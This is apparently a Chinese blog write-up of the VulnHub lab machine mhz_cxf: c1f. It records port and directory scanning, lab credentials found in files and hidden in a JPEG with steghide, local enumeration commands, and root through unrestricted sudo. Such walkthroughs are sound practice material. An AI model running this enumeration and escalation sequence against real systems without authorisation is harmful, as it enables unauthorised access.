---
title: mhz_cxf-c1f
author: Creexile
date: 2025-01-05 23:14:27
lastMod: 2025-01-05
summary: 'easyNo.5'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [隐写, 信息收集, 渗透]
---

# mhz_cxf: c1f

---

easyNo.5

> 来源: [vulnhub靶场-mhz_cxf: c1f](https://www.vulnhub.com/entry/mhz_cxf-c1f,471/)
>
> 目标: root
>
> 提示: You will learn a little about enumeration/local enumeration , steganography.
>
> 妙妙工具: bash

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.18

## 信息收集

nmap

```
nmap -A 192.168.56.18

22/tcp open  ssh
80/tcp open  http
```

80访问后是一个引导界面, 无时机作用, 进行目录扫描

```
dirb http://192.168.56.18
dirsearch -u http://192.168.56.18
```

还是没有, 而此处没有更多的利用点了, 那就换一个更大的字典扫描:

> `/usr/share/wordlists/` 下有一大堆字典, dirb自己的字典小的不行, 我推荐用别的
>
> 字典太大内存爆了, 唉

```
dirb http://192.168.56.18 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w
```

反正就是扫到了(恼), 扫到一个`notes.txt`, 再等下去睡着了还没打出来

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105204043.png)

找到`remb.txt`和`remb2.txt`两个文件, 其中`remb.txt`中有"flag":

```
first_stage:flagitifyoucan1234
```

## getshell

你说的对, 但是没思路就可以开始乱来了, 是不是账密我一试便知:

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105204903.png)

## 信息收集

```bash
# 系统信息 Linux mhz_c1f 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 4.15.0-96-generic
uname -r
# 查看环境
nc -h
# 查看特权文件, 似乎没有
find / -perm -4000 2>/dev/null
# 看看权限, 无发现
sudo -l
# 看看计划任务, 没东西
cat /etc/crontab
```

用户目录下有个user.txt, 让我们继续加油拿到root

```
HEEEEEY , you did it
that's amazing , good job man

so just keep it up and get the root bcz i hate low privileges ;)

#mhz_cyber
```

过了一会儿, 发现我们有权限读取mhz_c1f用户下的文件, 发现在Paintings文件夹下有四个jpeg文件

> 要是root权限, 不然总是Permission denied

```bash
# sudo
scp -r first_stage@192.168.56.18:/home/mhz_c1f/Paintings/ ./picture/
```

提示说有图片隐写, 而jpeg常见的是藏文件, 低位数据隐写等

脚本小子登场:

```bash
# 都试了一下发现只有它有, 密码为空
steghide extract -sf spinning\ the\ wool.jpeg
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105230016.png)

内容如下, 看起来是和之前一样格式的账号和密码

```
ooh , i know should delete this , but i cant' remember it
screw me

mhz_c1f:1@ec1f
```

不能用ssh登录, 猜测是直接su切换用户, 成功切换

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105230340.png)

## 提权

查看权限, 发现可以在任意位置执行sudo, 那就sudo提权

```
sudo /bin/bash
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250105230535.png)

> 内核比较新, 以后看看能不能用脚本打

在`root`文件夹下拿到最后一个提示`.root.txt`

```
OwO HACKER MAN :D

Well done sir , you have successfully got the root flag.
I hope you enjoyed in this mission.

#mhz_cyber
```
